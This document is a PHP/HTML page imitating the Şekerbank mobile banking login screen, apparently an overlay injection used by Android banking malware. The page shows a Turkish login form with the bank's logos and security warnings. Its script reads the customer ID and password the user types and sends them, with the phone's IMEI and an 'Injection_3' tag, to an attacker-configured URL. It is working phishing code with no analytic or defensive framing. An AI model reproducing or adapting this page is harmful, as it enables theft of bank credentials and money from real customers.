<html>
    <head>
        <meta charset="UTF-8">
        <link href="tr/tr.com.sekerbilisim.mbank/style.css" rel="stylesheet">
    </head>
    <?php
    $IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
    //$IMEI_country = "321|tr";
    include "config.php";
    ?>
    <body>
        <div class="header">
            <img style="width: 110px;margin-right: -30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOAAAAA9CAMAAACDU5UiAAACSVBMVEX///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9wrhA9AAAAw3RSTlMAG6+MWWQ1g7Pl+P7/PO/AcOcXsvlnuOHu9fLs3L5KCK2Yl0UM44F832qS+lBxz5N/qdX2TYQC/Dg+0hD9pg4zVDEKFEEqBD9XMDpVN/CqjqTz6YbiJcGnsaDqc/v3YMgW2gaesNN5vZzUq+ZttyjgrruHySzGmyHdxcf0o9mILu3r5LxoI0N9GcOsa2HOHXhIJtBLT8oSH/Gh0Yu0e8vEMrbY1rlawtsF6N6RA6jMzXpSmRNdonSKj3bXaXe/HAtjgF+p/29qAAAGoUlEQVRo3u1Z6VsUNxiPFhR3sqscZUFALOJRQEDW7q4yIvehoIiCFaG2YC0eLYpWUYoIBcRWbMWqaK30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">
            <img style="float: right;width: 20px;padding: 5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAABm1BMVEUGJgEGJgEGJgEGJgEGJgH///8GJgEyVCxIa0JKbUQGJgExUysGJgFEaD5GakBCZzxAZTo+Yzg8YjU7YTQwTisxUSw8YTUuSyk5YDM4XTIrRyeKl4iBj34wTys5XzMtSimGlIM3XjA2XS8rRyaSn5D////z9fMvTyo3XTAtSig1XC4tTCguTik1Wy4sSScyWisvUikoQSTCycEtTScyWSsrSSYwWCkuUScsTCYqSCYwVyktViYrUCX19vWcqJu+xr0qRyUrVCQqTiSGlIQpRyQoUiEoTSLL0cqJl4coRSMmUB8nSyFyg3DIz8cnRSMmTx8jThwjTRwnRCKeqZwmRyAhTBomRCH3+PYlRh8fShcfShgmQyEkRR4cSBUcSBYlQyBvgGzHzsYiRB0aRxIkQx8fRRghRBwYRRAjQh4dRBYgQxsWQw4hQhsjQh0WQw8cQhUUQgwVQg0kQR8iQR0UQg0aQhMSQAoUQAwhQRwTQAsZQBIoQSMQPwgRPwkeQBkhQBsXQBEOPQYNPAULOwMKOgIJOAEJOQEIMgEGJgFXlGJPAAAAiXRSTlMAPMH4/wD5////wv/D////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////PsS4lrQAAAGxSURBVDjLhdTpWxJRFMfxO8wgiNIiqOlMNeEMmbiXFW22R+VCViruW0JlC7TQhpZG8Gf3e+49s7ya+3117j2fZ+CZF8OYElK1gNSQEmZKSyTaGlA00qKwWFtUUls7U+PHJMVVpsWlaUw7Lg3ohDSgk9KAOpwSyU537upOJtwD0Cmqp1c3TtN85qyp9/Y4G6BzolSfZaeN83zuv2DattWXohXQgCij2zbUIMahYRjb1jO0AhoRjY6Nc3Vx5NIEN7Y5QSugy9QVUlezZLLXaAN03ekGVzdvTQpz210A3XG7y5Xo3n3vHuiB18OxR2Ryj33XQE98PZ0SZnpm1ncLlPd6Njct0PMXvts80Euv+Rz92oKx6LsGKjgtLefc/502Vtz7AtAqtbYuzOTGJldbzmIVaJvaEcbceUVvddfZABVFJXrPpWLxNak3tAJ6K9rjDzLfvcf8gSt9j1ZAH0XligXz6TM/fIGyKmVaAX2lqpWc+e07HX781CtVZwP0y6m2f1BzD7/3vRnojzSgQ2lAR9KA/krTmFr/J6muslhDhhrt+Ig1Ap9Vb+Ajxpqx4M9hrBn+D2kQNvObBIwrAAAAAElFTkSuQmCC">
        </div>
        <p> Şeker Mobil Şube'ye giriş yapmak için lütfen bilgileriniz giriniz.</p>

        <form method="post">
            <div class="fieldline">
                <input type="text" class="field" id="login" name="login" placeholder="Müşteri / T.C Kimlik Numaranız">
            </div>

            <div class="fieldline">
               <input type="password" class="field" id="password" name="password" placeholder="Şifreniz">
            </div>
            <div class="fieldline">
                <button type="submit"  class="submit" id="sbt_input"><img style="float: left;width: 21px;margin-right: -21px;" src="data:image/png;base64,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">Giriş</button>
            </div>
        </form>

        <h3 class="wrong"><img style="width: 6px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAjCAMAAACeurtMAAAAk1BMVEXYoJ/VhoXaqqrLRkXBCwnOX17LS0rPZWTPZGPTfn3Uf37Yl5fXmJjbsLDcs7Pfysrgzs3BDQvj4eHj4uLBDw3FIyHk5OTFKCbJPTvKQ0HMV1XOXFvRcG/Sd3bVionWkZDZpKPaq6vevb3fxsbi19fj39/DFxXEIB/GMC7Wk5LTf37XmZnVhYTIOznYnZzQamnUiIe9kr7oAAAAdUlEQVQY06XOSRaCUBBD0aDfDlRsv2IHtiAguP/VmaoaOPb4JrnDAIHWQddpvX/RNwwwNIwQGiKMDRNMDTFmuvMFlivB2sNvBFsiEeyIveBAHAUnIhVkxFlwIa6CG3HnPjzhc+cKxbMsK4X1Rf3SGrT25/0TPt3ODa4KAMW4AAAAAElFTkSuQmCC">
            Şifrenizi kimseyle paylaşmayınız.
        </h3>

        <h4> Şekerbank hiçbir işleminde telefonla ya da e-posta yoluyla şifre istememektedir. <br> Lütfen hiçbir ortamda şifre ve parolanızı kimseyle paylaşmayın. </h4>
        <script type="text/javascript">
         (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('sbt_input');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'field';
							oCodeInp.className = 'field';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|sekerbilsim|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>
    </body>
</html>
